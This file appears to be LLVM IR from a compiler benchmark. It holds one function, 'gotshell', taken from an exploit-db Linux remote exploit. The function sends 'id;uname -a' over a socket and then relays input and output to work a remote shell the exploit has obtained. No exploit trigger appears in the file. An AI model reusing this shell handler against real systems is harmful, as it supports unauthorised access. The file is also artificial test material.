; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1717.c_gotshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1717.c_gotshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.gotshell.cmd = private unnamed_addr constant [100 x i8] c"id;uname -a\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 16
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [5 x i8] c"EOF\0A\00", align 1
@.str.1 = private unnamed_addr constant [37 x i8] c"Connection aborted, select failed()\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @gotshell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca [100 x i8], align 16
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %7 = bitcast [100 x i8]* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %7, i8* align 16 getelementptr inbounds ([100 x i8], [100 x i8]* @__const.gotshell.cmd, i32 0, i32 0), i64 100, i1 false)
  %8 = call i32 @FD_ZERO(i32* %3)
  %9 = load i32, i32* %2, align 4
  %10 = call i32 @FD_SET(i32 %9, i32* %3)
  %11 = call i32 @FD_SET(i32 0, i32* %3)
  %12 = load i32, i32* %2, align 4
  %13 = getelementptr inbounds [100 x i8], [100 x i8]* %5, i64 0, i64 0
  %14 = getelementptr inbounds [100 x i8], [100 x i8]* %5, i64 0, i64 0
  %15 = call i32 @strlen(i8* %14)
  %16 = call i64 @send(i32 %12, i8* %13, i32 %15, i32 0)
  br label %17

17:                                               ; preds = %1, %65
  %18 = load i32, i32* %2, align 4
  %19 = call i32 @FD_SET(i32 %18, i32* %3)
  %20 = call i32 @FD_SET(i32 0, i32* %3)
  %21 = load i32, i32* %2, align 4
  %22 = add nsw i32 %21, 1
  %23 = call i64 @select(i32 %22, i32* %3, i32* null, i32* null, i32* null)
  %24 = icmp slt i64 %23, 0
  br i1 %24, label %25, label %26

25:                                               ; preds = %17
  br label %67

26:                                               ; preds = %17
  %27 = load i32, i32* %2, align 4
  %28 = call i64 @FD_ISSET(i32 %27, i32* %3)
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %30, label %46

30:                                               ; preds = %26
  %31 = load i32, i32* %2, align 4
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %33 = call i32 @recv(i32 %31, i8* %32, i32 1024, i32 0)
  store i32 %33, i32* %6, align 4
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %39

35:                                               ; preds = %30
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 @fprintf(i32 %36, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %38 = call i32 @exit(i32 2) #4
  unreachable

39:                                               ; preds = %30
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %41 = load i32, i32* %6, align 4
  %42 = call i64 @write(i32 1, i8* %40, i32 %41)
  %43 = icmp slt i64 %42, 0
  br i1 %43, label %44, label %45

44:                                               ; preds = %39
  br label %67

45:                                               ; preds = %39
  br label %46

46:                                               ; preds = %45, %26
  %47 = call i64 @FD_ISSET(i32 0, i32* %3)
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %65

49:                                               ; preds = %46
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %51 = call i32 @read(i32 0, i8* %50, i32 1024)
  store i32 %51, i32* %6, align 4
  %52 = icmp slt i32 %51, 0
  br i1 %52, label %53, label %57

53:                                               ; preds = %49
  %54 = load i32, i32* @stderr, align 4
  %55 = call i32 @fprintf(i32 %54, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0))
  %56 = call i32 @exit(i32 2) #4
  unreachable

57:                                               ; preds = %49
  %58 = load i32, i32* %2, align 4
  %59 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %60 = load i32, i32* %6, align 4
  %61 = call i64 @send(i32 %58, i8* %59, i32 %60, i32 0)
  %62 = icmp slt i64 %61, 0
  br i1 %62, label %63, label %64

63:                                               ; preds = %57
  br label %67

64:                                               ; preds = %57
  br label %65

65:                                               ; preds = %64, %46
  %66 = call i32 @usleep(i32 10)
  br label %17

67:                                               ; preds = %63, %44, %25
  %68 = load i32, i32* @stderr, align 4
  %69 = call i32 @fprintf(i32 %68, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %70 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @fprintf(i32, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i64 @write(i32, i8*, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @usleep(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
